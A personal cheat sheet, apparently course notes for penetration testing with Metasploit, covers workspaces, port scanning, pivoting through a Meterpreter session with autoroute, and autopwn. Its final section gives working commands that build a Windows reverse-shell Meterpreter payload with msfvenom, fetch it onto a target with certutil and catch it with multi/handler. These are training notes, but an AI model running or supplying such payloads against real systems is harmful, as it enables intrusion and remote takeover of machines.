

### workspaces
-a add
-d delete
-r rename
workspace and name will activate

Can import nmap scans into metasploit as well
-db_import nmap scan

### scanning/pivot
> Video is in [url](https://my.ine.com/CyberSecurity/courses/06040120/host-network-penetration-testing-the-metasploit-framework-msf) under enumeration and Port Scanning with Aux Modules
>this is good to use as you scan get meterpreter session and then run scan via metasploit scanning from other PC

```
search portscan
```
this will return different scans that are possible

```
use scanner/portscan/tcp
```

Once on target machine, open `shell` to get subnet information. run ifconfig from machine. to find the second IP of different subnet. #pivot

Next add the route in meterpreter session
```
run autoroute -s <ip address>
```

This can be just the IP or an entire subnet. Once that's done background the session and perform new scan on new machine/subnet
In new session open another port scan and set rhosts to new IP address/subnet and scan away


### FTP Enumeration
See [services](obsidian://open?vault=cheatsheet&file=Services%2Fftp%20and%20sftp) section

### SMB Enumeration
See [services](obsidian://open?vault=cheatsheet&file=Services%2FSamba%20or%20SMB)]

### HTTP Enum
See [services](obsidian://open?vault=cheatsheet&file=Services%2Fhttp)

### MySQL
See [services](obsidian://open?vault=cheatsheet&file=Services%2FMySQL)

### ssh
See [services](obsidian://open?vault=cheatsheet&file=Services%2Fssh)

### SMTP
See [services](obsidian://open?vault=cheatsheet&file=Services%2FSMTP)

### vulnerability scanning

metasploit-autopwn <- found on github. Automatically finds vulns based on scan internal to msf

Suggest move to `/usr/share/metasploit-framework/plugins`

To use: `load db_autopwn`

*Note: tool is depreciated and might not work as expected*

###  staged meterpreter session

Using #msfvenom to create #meterpreter session. reverse payload
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACK IP> LPORT=4444 -f exe > meterpreter.exe
```

After created move the file over to the system. Can use python http server module then use:
Python web server `python -m SimpleHTTPServer 80`
Windows: `certutil -urlcache -f http://<IP>/<filename> <output filename>`

Next setup handler with msfconsole
`use multi handler` and complete options, run. this is similar to nc -lvnp. Can create via `rc` file and then load into msfconsole
`use multi/handler`
`set payload windows/meterpreter/reverse_tcp`
`set LHOST <attack IP>`
`set LPORT 4444`


10.10.5.4